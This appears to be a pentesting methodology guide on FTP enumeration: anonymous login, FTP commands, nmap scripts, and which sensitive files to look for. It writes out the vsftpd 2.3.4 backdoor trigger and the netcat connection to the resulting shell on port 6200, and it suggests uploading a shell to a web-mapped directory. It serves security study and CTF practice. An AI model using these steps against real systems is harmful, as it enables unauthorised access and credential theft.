# 📁 FTP Enumeration

FTP (File Transfer Protocol) is one of the oldest protocols still running on modern systems. It was designed in the 1970s to transfer files between computers, and it still does exactly that, often with little to no security. When nmap finds port 21 open, you have something worth investigating.

---

## 🧠 What is FTP: Plain English

FTP is a protocol for transferring files between computers over a network. Think of it like a shared filing cabinet that you connect to over the internet or a local network. You log in, browse the files, and download or upload what you need.

The problem from a security perspective is that FTP was built before security was a priority:
- Credentials are transmitted in **plain text**: anyone watching the network can read your username and password
- Many FTP servers are configured to allow **anonymous login**: meaning anyone can connect without credentials
- Files left on FTP servers are often sensitive: backups, configs, database dumps, credentials

**Ports:**
- `21`: FTP control channel (commands)
- `20`: FTP data channel (file transfers)
- `990`: FTPS (FTP over SSL) control channel

---

## 🔍 Anonymous Login: Always Try This First

Anonymous FTP allows anyone to log in without a password. It was originally designed for public file distribution but is frequently left enabled on servers that should be private.
```bash
# Connect to FTP server
ftp <target>

# When prompted for username: type:
anonymous

# When prompted for password: type anything:
anonymous@
# or just press Enter
```

If anonymous login works you'll see:
```
230 Login successful.
ftp>
```

If it fails you'll see:
```
530 Login incorrect.
```

---

## 🖥️ Basic FTP Commands

Once connected: whether as anonymous or with credentials: these are the commands you need:
```bash
ftp> ls              # list files and directories
ftp> ls -la          # list all files including hidden
ftp> cd FolderName   # change directory
ftp> pwd             # show current directory
ftp> get filename    # download a single file
ftp> mget *          # download ALL files in current directory
ftp> put filename    # upload a file
ftp> binary          # switch to binary mode (use for non-text files)
ftp> ascii           # switch to ASCII mode (use for text files)
ftp> bye             # disconnect
```

> 💡 **Always switch to binary mode before downloading non-text files**: images, executables, zip files, databases. ASCII mode corrupts binary files during transfer.

---

## 📦 Installation

**Linux/macOS:** Pre-installed on most systems
```bash
# If not installed
sudo apt install ftp        # Linux
brew install inetutils      # macOS
```

**Windows:** Built into Windows: open Command Prompt and type `ftp`

For a better FTP client experience:
- **Linux/macOS:** `lftp`: `sudo apt install lftp` or `brew install lftp`
- **Windows:** FileZilla: https://filezilla-project.org

---

## 🔎 What to Look For

**Files worth downloading immediately:**
- Any `.txt`, `.cfg`, `.conf`, `.ini` files: often contain credentials
- Any `.bak`, `.backup`, `.old` files: backups of configs or databases
- Any `.sql` files: database dumps
- Any `.php`, `.py`, `.sh` files: source code that might contain hardcoded credentials
- Any `.key`, `.pem`, `.pub` files: SSH keys or certificates
- `.htpasswd` files: Apache password files

**Signs you're on something interesting:**
- You can write files to the server (upload access)
- You find a directory that maps to a web server path (upload a shell)
- You find credentials in config files that work elsewhere

---

## ⚙️ Automated Enumeration with nmap

Before connecting manually, let nmap tell you what the FTP server is running:
```bash
# Get FTP banner and version
nmap -sV -p 21 <target>

# Run FTP-specific scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 <target>

# Check for anonymous login specifically
nmap --script ftp-anon -p 21 <target>
```

**Notable nmap FTP scripts:**
| Script | What it checks |
|---|---|
| `ftp-anon` | Tests for anonymous login and lists accessible files |
| `ftp-vsftpd-backdoor` | Checks for the infamous vsftpd 2.3.4 backdoor |
| `ftp-bounce` | Tests for FTP bounce attack vulnerability |
| `ftp-syst` | Gets system information from the FTP server |

---

## ⚠️ vsftpd 2.3.4: The Famous Backdoor

vsftpd 2.3.4 was a widely used FTP server that had a backdoor introduced into its source code in 2011. When you send a username containing `:)`: a smiley face: the backdoor opens a shell on port 6200.

If nmap identifies vsftpd 2.3.4, check for this immediately:
```bash
# Check with nmap
nmap --script ftp-vsftpd-backdoor -p 21 <target>

# Manual check: if vulnerable, port 6200 opens after this
ftp <target>
Username: anything:)
Password: anything

# Then connect to the backdoor shell
nc <target> 6200
```

This vulnerability appears on HTB and is a classic example of why version detection matters.

---

## ⚔️ CTF vs Professional Use

| Situation | CTF | Professional Engagement |
|---|---|---|
| Anonymous login | Try immediately | Try immediately: document finding |
| Download all files | Yes: grab everything | Yes: document what was accessible |
| Upload files | Try it | Only if explicitly in scope |
| Brute force credentials | If no lockout | Check password policy first |
| vsftpd backdoor | Exploit it | Document: critical finding |

---

*by SudoChef · Part of the SudoCode Pentesting Methodology Guide*